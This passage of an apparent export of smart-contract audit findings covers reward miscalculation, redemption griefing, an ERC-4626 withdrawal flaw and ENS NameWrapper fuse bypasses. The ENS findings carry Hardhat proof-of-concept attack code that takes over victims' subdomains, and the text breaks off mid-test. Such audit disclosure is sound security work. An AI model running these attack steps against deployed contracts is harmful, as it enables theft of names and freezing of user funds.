producerToken, address user) public {     if (address(producerToken) == address(0)) revert ZeroAddress();     if (user == address(0)) revert ZeroAddress();      UserState storage u = producerTokens[producerToken].userStates[user];     uint256 balance = producerToken.balanceOf(user);      // Calculate the amount of rewards accrued by the user up to this call     uint256 rewards = u.rewards +     u.lastBalance *     (block.timestamp - u.lastUpdate);          u.lastUpdate = block.timestamp.safeCastTo32();     u.lastBalance = balance.safeCastTo224();     u.rewards = rewards;     ..SNIP.. } ```  When a user claims the rewards, the number of reward tokens the user is entitled to is equal to the `rewardState` scaled by the ratio of the `userRewards` to the `globalRewards`. Refer to Line 403 below.  The `rewardState` represents the total number of a specific ERC20 reward token (e.g. WETH or esGMX) held by a producer (e.g. pxGMX or pxGPL).   The `rewardState` of each reward token (e.g. WETH or esGMX) will increase whenever the rewards are harvested by the producer (e.g. `PirexRewards.harvest` is called). On the other hand, the `rewardState` will decrease if the users claim the rewards.  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexRewards.sol#L373  ```solidity File: PirexRewards.sol 373:     function claim(ERC20 producerToken, address user) external { ..SNIP.. 395:             // Transfer the proportionate reward token amounts to the recipient 396:             for (uint256 i; i < rLen; ++i) { 397:                 ERC20 rewardToken = rewardTokens[i]; 398:                 address rewardRecipient = p.rewardRecipients[user][rewardToken]; 399:                 address recipient = rewardRecipient != address(0) 400:                     ? rewardRecipient 401:                     : user; 402:                 uint256 rewardState = p.rewardStates[rewardToken]; 403:                 uint256 amount = (rewardState * userRewards) / globalRewards; ..SNIP.. 417:     } ```  #### How reward tokens are distributed  The Multiplier Point (MP) effect will be ignored for simplicity. Assume that the emission rate is constant throughout the entire period (from T80 to T84) and the emission rate is 1 esGMX per 1 GMX staked per second.  The graph below represents the amount of GMX tokens Alice and Bob staked for each second during the period.   A = Alice and B = Bob; each block represents 1 GMX token staked.  ![](https://user-images.githubusercontent.com/102820284/204132445-50422095-c02c-4f45-95d6-575667211092.png)  Based on the above graph:  - Alice staked 1 GMX token from T80 to T84. Alice will earn five (5) esGMX tokens at the end of T84. - Bob staked 4 GMX tokens from T83 to T84. Bob will earn eight (8) esGMX tokens at the end of T84. - A total of 13 esGMX will be harvested by `PirexRewards` contract at the end of T84  The existing reward distribution design in the `PirexRewards` contract will work perfectly if the emission rate is constant, similar to the example above.  In this case, the state variable will be as follows at the end of T84, assuming both the global and all user states have been updated and rewards have been harvested.  - rewardState = 13 esGMX tokens (5 + 8) - globalRewards = 13 - Accrued `userRewards` of Alice = 5 - Accrued `userRewards` of Bob = 8  When Alice calls the `PirexRewards.claim` function to claim her rewards at the end of T84, she will get back five (5) esGMX tokens, which is correct.  ```solidity (rewardState * userRewards) / globalRewards (13 * 5) / 13 = 5 ```  ## Proof of Concept  However, the fact is that the emission rate of reward tokens (e.g. esGMX or WETH) is not constant. Instead, the emission rate is dynamic and depends on various factors, such as the following:  - The number of rewards tokens allocated by GMX governance for each month. Refer to https://gov.gmx.io/t/esgmx-emissions/272. In some months, the number of esGMX emissions will be higher. - The number of GMX/GLP tokens staked by the community. The more tokens being staked by the community users, the more diluted the rewards will be.  The graph below represents the amount of GMX tokens Alice and Bob staked for each second during the period.   A = Alice and B = Bob; each block represents 1 GMX token staked.  ![](https://user-images.githubusercontent.com/102820284/204132445-50422095-c02c-4f45-95d6-575667211092.png)  The Multiplier Point (MP) effect will be ignored for simplicity. Assume that the emission rate is as follows:  - From T80 to 82: 2 esGMX per 1 GMX staked per second (Higher emission rate) - From T83 to 84: 1 esGMX per 1 GMX staked per second (Lower emission rate)  By manually computing the amount of esGMX reward tokens that Alice is entitled to at the end of T84:  ```solidity [1 staked GMX * (T82 - T80) * 2esGMX/sec] + [1 staked GMX * (T84 - T83) * 1esGMX/sec] [1 staked GMX * 3 secs * 2esGMX/sec] + [1 staked GMX * 2secs * 1esGMX/sec] 6 + 2 = 8 ```  Alice will be entitled to 8 esGMX reward tokens at the end of T84.  By manually computing the amount of esGMX reward tokens that Bob is entitled to at the end of T84:  ```solidity [4 staked GMX * 2secs * 1esGMX/sec] = 8 ```  Bob will be entitled to 8 esGMX reward tokens at the end of T84.  However, the existing reward distribution design in the `PirexRewards` contract will cause Alice to get fewer reward tokens than she is entitled to and cause Bob to get more rewards than he is entitled to.  The state variable will be as follows at the end of T84, assuming both the global and all user states have been updated and rewards have been harvested.  - rewardState = 16 esGMX tokens (8 + 8) - globalRewards = 13 - Accrued `userRewards` of Alice = 5 - Accrued `userRewards` of Bob = 8  When Alice calls the `PirexRewards.claim` function to claim her rewards at the end of T84, she will only get back six (6) esGMX tokens, which is less than eight (8) esGMX tokens she is entitled to or earned.  ```solidity (rewardState * userRewards) / globalRewards (16 * 5) / 13 = 6.15 = 6 ```  When Bob calls the `PirexRewards.claim` function to claim his rewards at the end of T84, he will get back nine (9) esGMX tokens, which is more than eight (8) esGMX tokens he is entitled to or earned.  ```solidity (rewardState * userRewards) / globalRewards (16 * 8) / 13 = 9.85 = 9 ```  ## Impact  As shown in the PoC, some users will lose their reward tokens due to the miscalculation within the existing reward distribution design.  ## Recommended Mitigation Steps  Update the existing reward distribution design to handle the dynamic emission rate. Implement the RewardPerToken for users and global, as seen in many of the well-established reward contracts below, which is not vulnerable to this issue:  - https://github.com/fei-protocol/flywheel-v2/blob/dbe3cb81a3dc2e46536bb8af9c2bdc585f63425e/src/FlywheelCore.sol#L226 - https://github.com/Synthetixio/synthetix/blob/2cb4b23fe409af526de67dfbb84aae84b2b13747/contracts/StakingRewards.sol#L61"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-13"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/gzeon-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-10"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/codeislight-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-09"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/Rolezn-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-08"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/aphak5010-G.md)."}, {"title": "The 'redeem' related functions are likely to be blocked", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/113", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L615 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L685 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/PirexGmx.sol#L712   # Vulnerability details  ## Impact The following 'redeem' related functions are likely to be blocked, users will not be able to retrieve their funds. ``` function _redeemPxGlp(     address token,     uint256 amount,     uint256 minOut,     address receiver ); function redeemPxGlpETH(     uint256 amount,     uint256 minOut,     address receiver ); function redeemPxGlp(     address token,     uint256 amount,     uint256 minOut,     address receiver ); ```  ## Proof of Concept The 'GlpManager' contract of GMX has a 'cooldownDuration' limit on redeem/unstake ('_removeLiquidity()'). While there is at least one deposit/stake ('_addLiquidity()') operation in the past 'cooldownDuration' time, redemption would fail. Obviously this limitation is user-based,  and 'PirexGmx' contract is one such user.  https://github.com/gmx-io/gmx-contracts/blob/c3618b0d6fc1b88819393dc7e6c785e32e78c72b/contracts/core/GlpManager.sol#L234  ``` Current setting of 'cooldownDuration' is 15 minutes, the max value is 2 days. ``` https://arbiscan.io/address/0x321f653eed006ad1c29d174e17d96351bde22649#readContract  Due to the above limit, there are 3 risks that can block redemption for Pirex users.  1.__The normal case__ Let's say there is 10% GMX users will use Pirex to manage their GLP.  By checking recent history of GMX router contract, we can find the average stake interval is smaller than 1 minute https://arbiscan.io/address/0xa906f338cb21815cbc4bc87ace9e68c87ef8d8f1 Let's take ``` averageStakeIntervalOfGMX = 30 seconds ``` So if Pirex has 10% of GMX users, then ``` averageStakeIntervalOfPirex = 30 \u00f7 10% = 300 seconds ``` The probability of successfully redeeming is a typical Poisson distribution: https://en.wikipedia.org/wiki/Poisson_distribution With ``` \u03bb = cooldownDuration \u00f7 averageStakeIntervalOfPirex = 15 * 60 \u00f7 300 = 3 k = 0 ``` So we get ``` P \u2248 1 \u00f7 (2.718 * 2.718 * 2.718) \u2248 0.05  ``` Conclusion ``` If Pirex has 10 % of GMX users, then the redemption will fail with 95% probability. ```  A full list of % of GMX users versus failure probability of redemption ``` 1% : 26% 5% : 78% 10% : 95% 20% : 99.75% 30% : 99.98% ```  2.__The attack case__ If an attacker, such as bad competitors of similar projects, try to exploit this vulnerability. Let's estimate the cost for attack.  As attacker can deposit a very small GLP, such as 1 wei, so we can ignore the GLP cost and only focus on GAS cost.  By checking the explorer history https://arbiscan.io We are safe to assume the cost for calling 'depositGlpETH()' or 'depositGlp' is ``` txCost = 0.1 USD ```  To block redemption, attacker have to execute a deposit call every 15 minutes, so ``` dailyCost = 24 * (60 / 15) * 0.1 = 9.6 USD yearCost = 365 * 9.6 = 3504 USD ``` Conclusion ``` If an attacker want to block Pirex users funds, his yearly cost is only about 3.5k USD. ```  3.__GMX adjusts protocol parameters__ If GMX increases 'cooldownDuration' to 2 days, it will obviously cause redemption not working.  ## Tools Used VS Code  ## Recommended Mitigation Steps Reserve some time range for redemption only. e.g. 1 of every 7 days."}, {"title": "AutoPxGmx.maxWithdraw and AutoPxGlp.maxWithdraw functions calculate asset amount that is too big and cannot be withdrawn", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-04"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L225 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L14 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGlp.sol#L14 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L315 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L199 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L215-L216 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L332   # Vulnerability details  ## Impact The ERC-4626 Tokenized Vault Standard requires the `maxWithdraw` function to be implemented ([https://ethereum.org/en/developers/docs/standards/tokens/erc-4626/#maxwithdraw](https://ethereum.org/en/developers/docs/standards/tokens/erc-4626/#maxwithdraw)).    This function is supposed to return \"the maximum amount of underlying assets that can be withdrawn from the owner balance with a single withdraw call\".    The `PirexERC4626` contract implements this function ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L225](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L225)).   It is implemented correctly when `PirexERC4626` is used on its own.    However in this project, the `PirexERC4626` contract is not used on its own but inherited by `AutoPxGmx` ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L14](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L14)) and `AutoPxGlp` ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGlp.sol#L14](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGlp.sol#L14)).    `AutoPxGmx` and `AutoPxGlp` implement a `withdrawalPenalty` i.e. a fee that is paid when a user wants to withdraw assets from the vault.    `AutoPxGmx` and `AutoPxGlp` do not override the `maxWithdraw` function.    This causes the `maxWithdraw` function to return an amount of assets that is too big to be withdrawn.    So when `maxWithdraw` is called and with the returned amount `withdraw` is called, the call to `withdraw` will revert.    This can cause issues in any upstream components that rely on `AutoPxGmx` and `AutoPxGlp` to correctly implement the ERC4626 standard.    For example an upstream wrapper might only allow withdrawals with the maximum amount and determine this maximum amount by calling the `maxWithdraw` function. As this function returns a value that is too big, no withdrawals will be possible.    ## Proof of Concept 1. The `maxWithdraw` function in a `AutoPxGmx` contract is called 2. Now the `withdraw` function is called with the value that was returned by the `maxWithdraw` function ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L315](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L315)) 3. The `withdraw` function in turn calls the `previewWithdraw` function ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L199](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L199)) 4. The `previewWithdraw` function will increase the amount of shares to include the `withdrawalPenalty` ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L215-L216](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L215-L216)) which causes the amount of shares to burn to be too large and the call to `burn` will revert ([https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L332](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L332))  ## Tools Used VSCode  ## Recommended Mitigation Steps In the `AutoPxGmx` and `AutoPxGlp` function implement the `maxWithdraw` function that overrides the function in `PirexERC4626` and takes into account the `withdrawalPenalty`.    Potential fix: ```solidity function maxWithdraw(address owner) public view override returns (uint256) {     uint256 shares = balanceOf(owner);      // Calculate assets based on a user's % ownership of vault shares     uint256 assets = convertToAssets(shares);      uint256 _totalSupply = totalSupply;      // Calculate a penalty - zero if user is the last to withdraw     uint256 penalty = (_totalSupply == 0 || _totalSupply - shares == 0)         ? 0         : assets.mulDivDown(withdrawalPenalty, FEE_DENOMINATOR);      // Redeemable amount is the post-penalty amount     return assets - penalty; } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-05"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/chaduke-G.md)."}, {"title": "[ZZ-004] During the deprecation period where both .eth registrar controllers are active, a crafted hack can be launched and cause the same malicious consequences of [ZZ-001] even if [ZZ-001] is properly fixed", "html_url": "https://github.com/code-423n4/2022-11-ens-findings/issues/16", "labels": ["bug", "3 (High Risk)", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-ens-findings", "body": "+ Severity: High\r + Status: Has not been reported\r \r ### Description,\r \r Specifically, according to the [documentation](https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper#register-wrapped-names), there will be a deprecation period that two types of .eth registrar controllers are active.\r \r > Names can be registered as normal using the current .eth registrar controller. However, the new .eth registrar controller will be a controller on the NameWrapper, and have NameWrapper will be a controller on the .eth base registrar.\r \r > Both .eth registrar controllers will be active during a deprecation period, giving time for front-end clients to switch their code to point at the new and improved .eth registrar controller.\r \r The current .eth registrar controller can directly register ETH2LD and send to the user, while the new one will automatically wrap the registered ETH2LD.\r \r If the two .eth registrar controllers are both active, an ETH2LD node can be __implicitly__ unwrapped while the NameWrapper owner remains to be the hacker.\r \r __Note that this hack can easily bypass the patch of [ZZ-001].__\r \r Considering the following situtation.\r \r + the hacker registered and wrapped an ETH2LD node `sub1.eth`, with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` burnt. The ETH2LD will be expired shortly and can be re-registred within the aformentioned deprecation period.\r \r + after `sub1.eth` is expired, the hacker uses the current .eth registrar controller to register `sub1.eth` to himself.\r     - _at this step, the `sub1.eth` is implicitly unwrapped_.\r     - the hacker owns the registrar ERC721 as well as the one of ENS registry for `sub1.eth`.\r     - however, `sub1.eth` in NameWrapper remains valid.\r     \r + he sets `EnsRegistry.owner` of `sub1.eth` as NameWrapper. \r     - note that __this is to bypass the proposed patch for [ZZ-001].__\r     \r + he wraps `sub2.sub1.eth` with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` and trafers it to a victim user.\r \r + he uses `BaseRegistrar::reclaim` to become the `EnsRegistry.owner` of `sub1.eth`\r     - at this step, the hack can be launched as __[ZZ-001]__ does.\r  \r For example, \r \r + he can first invokes `EnsRegistry::setSubnodeOwner` to become the owner of `sub2.sub1.eth`\r \r + he then invokes `NameWrapper::wrap` to wrap `sub2.sub1.eth` to re-claim as the owner.\r \r __Note that it does not mean the impact of the above hack is limited in the deprecation period__. \r \r What the hacker needs to do is to re-registers `sub1.eth` via the old .eth registrar controller (in the deprecation period). He can then launch the attack any time he wants.\r \r ### PoC\r \r ```js\r     it('Attack happens within the deprecation period where both .eth registrar controllers are active', async () => {\r       await NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         1 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r \r       // wait the ETH2LD expired and re-register to the hacker himself\r       await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)\r       await evm.mine()\r \r       // XXX: note that at this step, the hackler should use the current .eth\r       // registrar to directly register `sub1.eth` to himself, without wrapping\r       // the name.\r       await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)\r       expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)\r       expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)\r \r       // set `EnsRegistry.owner` as NameWrapper. Note that this step is used to\r       // bypass the newly-introduced checks for [ZZ-001]\r       //\r       // XXX: corrently, `sub1.eth` becomes a normal node\r       await EnsRegistryH.setOwner(wrappedTokenId1, NameWrapper.address)\r \r       // create `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL`\r       // burnt.\r       await NameWrapperH.setSubnodeOwner(\r         wrappedTokenId1,\r         label2,\r         account2,\r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(account2)\r \r       // XXX: reclaim the `EnsRegistry.owner` of `sub1.eth` as the hacker\r       await BaseRegistrarH.reclaim(labelHash1, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)\r       expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)\r \r       // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r \r       // wrap `sub2.sub1.eth` to re-claim as the owner\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r     })\r ```\r \r ### Patch\r \r May need to discuss with ENS team. A naive patch is to check whther a given ETH2LD node is indeed wrapped every time we operate it. However, it is not gas-friendly."}, {"title": "[ZZ-001] `PARENT_CANNOT_CONTROL` and `CANNOT_CREATE_SUBDOMAIN` fuses can be bypassed", "html_url": "https://github.com/code-423n4/2022-11-ens-findings/issues/14", "labels": ["bug", "3 (High Risk)", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-11-ens-findings", "body": "+ Severity: High\r + Status: Has been reported to and comfirmed by Jeff (ENS team)\r + Report Time: 11/28/2022 12:31 AM EST\r \r <img width=\"1039\" alt=\"image\" src=\"https://user-images.githubusercontent.com/14835483/205164500-82688b51-7261-43bd-aca0-fc1175bcb6e8.png\">\r \r \r ### Description\r \r The fuse constraints can be violated by a malicious owner of the parent node (i.e., the hacker). There are two specific consequences the hacker can cause.\r \r + Suppose the subnode has been assigned to a victim user, the hacker can re-claim him as the owner of the subnode even if the `PARENT_CANNOT_CONTROL` of the subnode has been burnt.\r + Suppose the owner of the subnode remains to be the hacker, he can create sub-subnode even if the `CANNOT_CREATE_SUBDOMAIN` of the subnode has been burnt.\r \r Basically, ENS NameWrapper uses the following rules to prevent all previous C4 hacks (note that I will assume the audience has some background regarding the ENS codebase).\r \r + The `PARENT_CANNOT_CONTROL` fuse of a subnode can be burnt if and only if the `CANNOT_UNWRAP` fuse of its parent has already been burnt.\r + The `CANNOT_UNWRAP` fuse of a subnode can be burnt if and only if its `PARENT_CANNOT_CONTROL` fuse has already been burnt.\r \r However, such guarantees would only get effective when the `CANNOT_UNWRAP` fuse of the subject node is burnt. \r \r Considering the following scenario.\r \r 1. `sub1.eth` (the ETH2LD node) is registered and wrapped to the hacker - _the ENS registry owner, i.e., `ens.owner`, of `sub1.eth` is the NameWrapper contract._\r \r 2. `sub2.sub1.eth` is created with no fuses burnt, where the wrapper owner is still the hacker - _the ENS registry owner of `sub2.sub1.eth` is the NameWrapper contract._\r \r 3. `sub3.sub2.sub1.eth` is created with no fuses burnt and owned by a victim user - _the ENS registry owner of `sub3.sub2.sub1.eth` is the NameWrapper contract._\r \r 4. the hacker unwraps `sub2.sub1.eth` - _the ENS registry owner of `sub2.sub1.eth` becomes the hacker._\r \r 5. via ENS registry, the hacker claims himself as the ENS registry owner of `sub3.sub2.sub1.eth`. Note that the `sub3.sub2.sub1.eth` in the NameWrapper contract remains valid till now - _the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker._\r \r 6. the hacker wraps `sub2.sub1.eth` - _the ENS registry owner of `sub2.sub1.eth` becomes the NameWrapper contract._\r \r 7. the hacker burns the `PARENT_CANNOT_CONTROL` and `CANNOT_UNWRAP` fuses of `sub2.sub1.eth`.\r \r 8. the hacker burns the `PARENT_CANNOT_CONTROL`, `CANNOT_UNWRAP`, and `CANNOT_CREATE_SUBDOMAIN` fuses of `sub3.sub2.sub1.eth`. __Note that the current ENS registry owner of `sub3.sub2.sub1.eth` remains to be the hacker__\r \r At this stage, things went wrong. \r \r Again, currently the `sub3.sub2.sub1.eth` is valid in NameWrapper w/ `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN` burnt, but the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker.\r \r The hacker can:\r \r + invoke `NameWrapper::wrap` to wrap `sub3.sub2.sub1.eth`, and re-claim himself as the owner of `sub3.sub2.sub1.eth` in NameWrapper.\r + invoke `ENSRegistry::setSubnodeRecord` to create `sub4.sub3.sub2.sub1.eth` and wrap it accordingly, violating `CANNOT_CREATE_SUBDOMAIN`\r \r ### PoC\r \r The attached `poc_ens.js` file demonstrates the above hack, via 6 different attack paths.\r \r To validate the PoC, put the file in `./test/wrapper` and run `npx hardhat test test/wrapper/poc_ens.js`\r \r ### Patch\r \r As discussed with Jeff, the attached `NameWrapper.sol` file demonstrates the patch. \r \r In short, we try to guarantee only fuses of __wrapped__ nodes can be burnt.\r \r ## poc_ens.js\r ```javscript\r const { ethers } = require('hardhat')\r const { use, expect } = require('chai')\r const { solidity } = require('ethereum-waffle')\r const { labelhash, namehash, encodeName, FUSES } = require('../test-utils/ens')\r const { evm } = require('../test-utils')\r const { shouldBehaveLikeERC1155 } = require('./ERC1155.behaviour')\r const { shouldSupportInterfaces } = require('./SupportsInterface.behaviour')\r const { shouldRespectConstraints } = require('./Constraints.behaviour')\r const { ZERO_ADDRESS } = require('@openzeppelin/test-helpers/src/constants')\r const { deploy } = require('../test-utils/contracts')\r const { EMPTY_BYTES32, EMPTY_ADDRESS } = require('../test-utils/constants')\r \r const abiCoder = new ethers.utils.AbiCoder()\r \r use(solidity)\r \r const ROOT_NODE = EMPTY_BYTES32\r \r const DUMMY_ADDRESS = '0x0000000000000000000000000000000000000001'\r const DAY = 86400\r const GRACE_PERIOD = 90 * DAY\r \r function increaseTime(delay) {\r   return ethers.provider.send('evm_increaseTime', [delay])\r }\r \r function mine() {\r   return ethers.provider.send('evm_mine')\r }\r \r const {\r   CANNOT_UNWRAP,\r   CANNOT_BURN_FUSES,\r   CANNOT_TRANSFER,\r   CANNOT_SET_RESOLVER,\r   CANNOT_SET_TTL,\r   CANNOT_CREATE_SUBDOMAIN,\r   PARENT_CANNOT_CONTROL,\r   CAN_DO_EVERYTHING,\r   IS_DOT_ETH,\r } = FUSES\r \r describe('Name Wrapper', () => {\r   let ENSRegistry\r   let ENSRegistry2\r   let ENSRegistryH\r   let BaseRegistrar\r   let BaseRegistrar2\r   let BaseRegistrarH\r   let NameWrapper\r   let NameWrapper2\r   let NameWrapperH\r   let NameWrapperUpgraded\r   let MetaDataservice\r   let signers\r   let accounts\r   let account\r   let account2\r   let hacker\r   let result\r   let MAX_EXPIRY = 2n ** 64n - 1n\r \r   /* Utility funcs */\r \r   async function registerSetupAndWrapName(label, account, fuses) {\r     const tokenId = labelhash(label)\r \r     await BaseRegistrar.register(tokenId, account, 1 * DAY)\r \r     await BaseRegistrar.setApprovalForAll(NameWrapper.address, true)\r \r     await NameWrapper.wrapETH2LD(label, account, fuses, EMPTY_ADDRESS)\r   }\r \r   before(async () => {\r     signers = await ethers.getSigners()\r     account = await signers[0].getAddress()\r     account2 = await signers[1].getAddress()\r     hacker = await signers[2].getAddress()\r \r     EnsRegistry = await deploy('ENSRegistry')\r     EnsRegistry2 = EnsRegistry.connect(signers[1])\r     EnsRegistryH = EnsRegistry.connect(signers[2])\r \r     BaseRegistrar = await deploy(\r       'BaseRegistrarImplementation',\r       EnsRegistry.address,\r       namehash('eth'),\r     )\r \r     BaseRegistrar2 = BaseRegistrar.connect(signers[1])\r     BaseRegistrarH = BaseRegistrar.connect(signers[2])\r \r     await BaseRegistrar.addController(account)\r     await BaseRegistrar.addController(account2)\r \r     MetaDataservice = await deploy(\r       'StaticMetadataService',\r       'https://ens.domains',\r     )\r \r     NameWrapper = await deploy(\r       'NameWrapper',\r       EnsRegistry.address,\r       BaseRegistrar.address,\r       MetaDataservice.address,\r     )\r     NameWrapper2 = NameWrapper.connect(signers[1])\r     NameWrapperH = NameWrapper.connect(signers[2])\r \r     NameWrapperUpgraded = await deploy(\r       'UpgradedNameWrapperMock',\r       NameWrapper.address,\r       EnsRegistry.address,\r       BaseRegistrar.address,\r     )\r \r     // setup .eth\r     await EnsRegistry.setSubnodeOwner(\r       ROOT_NODE,\r       labelhash('eth'),\r       BaseRegistrar.address,\r     )\r \r     // setup .xyz\r     await EnsRegistry.setSubnodeOwner(ROOT_NODE, labelhash('xyz'), account)\r \r     //make sure base registrar is owner of eth TLD\r     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(\r       BaseRegistrar.address,\r     )\r   })\r \r   beforeEach(async () => {\r     result = await ethers.provider.send('evm_snapshot')\r   })\r   afterEach(async () => {\r     await ethers.provider.send('evm_revert', [result])\r   })\r \r   describe('PoC', () => {\r     const label1 = 'sub1'\r     const labelHash1 = labelhash('sub1')\r     const wrappedTokenId1 = namehash('sub1.eth')\r \r     const label2 = 'sub2'\r     const labelHash2 = labelhash('sub2')\r     const wrappedTokenId2 = namehash('sub2.sub1.eth')\r \r     const label3 = 'sub3'\r     const labelHash3 = labelhash('sub3')\r     const wrappedTokenId3 = namehash('sub3.sub2.sub1.eth')\r \r     const label4 = 'sub4'\r     const labelHash4 = labelhash('sub4')\r     const wrappedTokenId4 = namehash('sub4.sub3.sub2.sub1.eth')\r \r     before(async () => {\r       await BaseRegistrar.addController(NameWrapper.address)\r       await NameWrapper.setController(account, true)\r     })\r \r     it('reclaim ownership - hack 1', async () => {\r       // step 1. sub1.eth to hacker\r       await 